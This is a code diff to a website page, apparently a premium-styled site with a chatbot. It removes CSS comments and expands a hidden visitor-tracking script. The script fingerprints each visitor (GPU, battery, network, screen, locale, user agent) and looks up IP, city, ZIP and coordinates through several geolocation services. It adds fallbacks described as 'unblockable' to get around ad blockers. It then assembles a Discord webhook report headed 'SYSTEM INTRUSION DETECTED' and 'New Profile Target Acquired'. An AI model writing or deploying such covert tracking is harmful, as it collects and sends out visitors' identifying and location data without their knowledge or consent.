@@ -20,19 +20,16 @@
            01. ENTERPRISE DESIGN SYSTEM & CSS VARIABLES
            ========================================================================== */
         :root {
-            /* Premium Dark Cosmos Palette */
             --bg-base: #000000;
             --bg-surface: rgba(5, 5, 5, 0.85); 
             --bg-surface-solid: #000000;
             --bg-surface-glass: rgba(0, 0, 0, 0.9);
             
-            /* Text Colors */
             --text-primary: #fafafa; 
             --text-secondary: #a1a1aa; 
             --text-tertiary: #71717a;
             --text-inverse: #000000;
             
-            /* Accents & Brand Colors */
             --accent-primary: #ffffff;
             --accent-indigo: #4f46e5;
             --accent-emerald: #10b981;
@@ -40,7 +37,6 @@
             --accent-purple: #bc13fe;
             --accent-neon-green: #39FF14;
             
-            /* Borders & Shadows */
             --border-light: rgba(255, 255, 255, 0.1);
             --border-medium: rgba(255, 255, 255, 0.2);
             --border-glow: rgba(0, 225, 255, 0.3);
@@ -50,12 +46,10 @@
             --shadow-md: 0 10px 40px -10px rgba(0, 0, 0, 0.8);
             --shadow-lg: 0 20px 60px -15px rgba(0, 0, 0, 0.9);
             
-            /* Advanced Easing Curves for Cinematic Motion */
             --ease-out-expo: cubic-bezier(0.19, 1, 0.22, 1);
             --ease-in-out-expo: cubic-bezier(0.87, 0, 0.13, 1);
             --ease-elastic: cubic-bezier(0.68, -0.55, 0.265, 1.55);
             
-            /* Layout & Spacing */
             --nav-height: 80px;
             --card-radius: 24px;
             --button-radius: 100px;
@@ -1508,14 +1502,12 @@ Keep responses concise (1-3 sentences). Be polite and premium in tone.`;
                     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
                     const colorDepth = window.screen.colorDepth || "Unknown";
 
-                    // 2. Advanced Network & Connection Data
-                    let connType = "Unknown";
-                    let connSpeed = "Unknown Mbps";
-                    let connPing = "Unknown ms";
+                    // 2. Advanced Network Data
+                    let connType = "Unknown", connSpeed = "Unknown Mbps", connPing = "Unknown ms";
                     if (navigator.connection) {
                         connType = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
-                        connSpeed = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "Unknown";
-                        connPing = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "Unknown";
+                        connSpeed = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "Unknown Mbps";
+                        connPing = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "Unknown ms";
                     }
 
                     // 3. GPU Extraction (WebGL Fingerprint)
@@ -1525,53 +1517,72 @@ Keep responses concise (1-3 sentences). Be polite and premium in tone.`;
                         const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
                         if (gl) {
                             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                            if (debugInfo) {
-                                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            if (debugInfo) { gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
+                        }
+                    } catch (e) { }
+
+                    // 4. Battery Extraction Fix
+                    let batteryStat = "Hidden by Browser";
+                    try {
+                        if ('getBattery' in navigator) {
+                            const batt = await navigator.getBattery();
+                            if (batt && typeof batt.level === 'number') {
+                                batteryStat = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Plugged In ⚡' : 'Unplugged 🔋'})`;
                             }
                         }
                     } catch (e) { }
 
-                    // 4. Battery Extraction (Might be blocked on some browsers, wrapped in try/catch)
-                    let batteryStat = "Hidden/Not Supported";
-                    try {
-                        if (navigator.getBattery) {
-                            const batt = await navigator.getBattery();
-                            batteryStat = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Plugged In ⚡' : 'Unplugged 🔋'})`;
-                        }
-                    } catch (e) { }
-
-                    // 5. IP & Advanced Geolocation Data
+                    // 5. BULLETPROOF IP & GEOLOCATION (Unmetered & Unblockable Fallbacks)
                     let ip = "Unknown", city = "Unknown", region = "Unknown", country = "Unknown";
-                    let isp = "Unknown", asn = "Unknown", org = "Unknown", zip = "Unknown", latLong = "Unknown";
+                    let isp = "Unknown", asn = "Unknown", zip = "Unknown", latLong = "Unknown";
                     
                     try {
-                        const ipRes = await fetch("https://ipapi.co/json/");
-                        const geoData = await ipRes.json();
-                        ip = geoData.ip || "Unknown";
-                        city = geoData.city || "Unknown";
-                        region = geoData.region || "Unknown";
-                        country = geoData.country_name || "Unknown";
-                        isp = geoData.org || "Unknown";
-                        asn = geoData.asn || "Unknown";
-                        zip = geoData.postal || "Unknown";
-                        latLong = (geoData.latitude && geoData.longitude) ? `${geoData.latitude}, ${geoData.longitude}` : "Unknown";
-                    } catch (e) {
-                        // Silent fail for adblockers
+                        // API 1: GeoJS (Highly reliable, no strict rate limits, rarely blocked)
+                        const res = await fetch("https://get.geojs.io/v1/ip/geo.json");
+                        if (!res.ok) throw new Error("GeoJS Failed");
+                        const geoData = await res.json();
+                        ip = geoData.ip || ip; city = geoData.city || city; region = geoData.region || region;
+                        country = geoData.country || country; isp = geoData.organization || geoData.organization_name || isp; 
+                        asn = geoData.asn || asn; latLong = (geoData.latitude && geoData.longitude) ? `${geoData.latitude}, ${geoData.longitude}` : latLong;
+                    } catch (e1) {
+                        try {
+                            // API 2: FreeIPAPI (Great secondary fallback)
+                            const res2 = await fetch("https://freeipapi.com/api/json");
+                            if (!res2.ok) throw new Error("FreeIPAPI Failed");
+                            const geoData2 = await res2.json();
+                            ip = geoData2.ipAddress || ip; city = geoData2.cityName || city; region = geoData2.regionName || region;
+                            country = geoData2.countryName || country; zip = geoData2.zipCode || zip; 
+                            latLong = (geoData2.latitude && geoData2.longitude) ? `${geoData2.latitude}, ${geoData2.longitude}` : latLong;
+                        } catch (e2) {
+                            try {
+                                // API 3: The "Unblockable" Cloudflare Trace (If adblockers kill everything else, this gets the IP)
+                                const res3 = await fetch("https://1.1.1.1/cdn-cgi/trace");
+                                const text = await res3.text();
+                                const lines = text.split('\n');
+                                lines.forEach(line => {
+                                    if(line.startsWith('ip=')) ip = line.split('=')[1];
+                                    if(line.startsWith('loc=')) country = line.split('=')[1];
+                                });
+                                isp = "Cloudflare Trace (Adblocker active)";
+                            } catch (e3) {
+                                ip = "Strictly Blocked by Browser";
+                            }
+                        }
                     }
 
-                    // Assembly: Build the Ultimate Discord Embed
+                    // 6. Build the Ultimate Discord Embed
                     const payload = {
                         username: "SYSTEM INTRUSION DETECTED",
                         avatar_url: "https://cdn-icons-png.flaticon.com/512/2165/2165578.png",
-                        content: "<@&YOUR_ROLE_ID> 🚨 **New Profile Target Acquired** 🚨", // Will ping if you add a role ID, otherwise just text
+                        content: "<@&YOUR_ROLE_ID> 🚨 **New Profile Target Acquired** 🚨", 
                         embeds: [{
                             title: "🔍 Deep Telemetry Report",
-                            color: 16711680, // Red
+                            color: 16711680, 
                             fields: [
                                 { name: "📍 Geolocation", value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}\n**ZIP:** ${zip}\n**Lat/Long:** \`${latLong}\``, inline: true },
-                                { name: "🌐 Network Routing", value: `**IP Address:** \`${ip}\`\n**ISP:** ${isp}\n**ASN:** \`${asn}\`\n**Connection:** ${connType} | ${connSpeed} | ${connPing} Ping`, inline: true },
+                                { name: "🌐 Network Routing", value: `**IP Address:** \`${ip}\`\n**ISP:** ${isp}\n**ASN:** \`${asn}\`\n**Connection:** ${connType} | ${connSpeed} | ${connPing}`, inline: true },
                                 { name: "💻 Hardware Fingerprint", value: `**CPU Cores:** ${cores}\n**Approx RAM:** ${ram} GB\n**GPU / Renderer:** \`${gpu}\`\n**Battery:** ${batteryStat}`, inline: false },
-                                { name: "🖥️ Display Metrics", value: `**Screen:** ${w}x${h} (${colorDepth}-bit)\n**Viewport:** ${vW}x${vH}\n**Touch Screen:** ${isTouch}\n**Theme:** ${darkMode}`, inline: true },
+                                { name: "🖥️ Display Metrics", value: `**Screen:** ${w}x${h} (${colorDepth}-bit)\n**Viewport:** ${vW}x${vH}\n**Touch:** ${isTouch}\n**Theme:** ${darkMode}`, inline: true },
                                 { name: "🌍 Context & Locale", value: `**Language:** ${lang}\n**Timezone:** ${timezone}\n**Local Time:** ${new Date().toLocaleTimeString()}\n**Referrer:** ${document.referrer || "Direct"}`, inline: true },
                                 { name: "🤖 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                             ],
